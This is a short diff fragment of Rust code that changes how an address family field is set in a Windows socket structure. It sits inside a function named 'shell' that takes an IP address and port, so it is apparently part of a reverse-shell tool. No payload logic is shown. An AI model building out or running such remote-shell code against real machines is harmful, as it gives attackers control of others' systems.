@@ -44,7 +44,7 @@ pub fn shell(ip: &str, port: u16) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inet_pton
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.inet_pton.html
     let mut sockaddr_in = SOCKADDR_IN {
-        sin_family: AF_INET.0 as u16,
+        sin_family: AF_INET,
         ..Default::default()
     };
     // This is magic that I don't really understand but seems to work
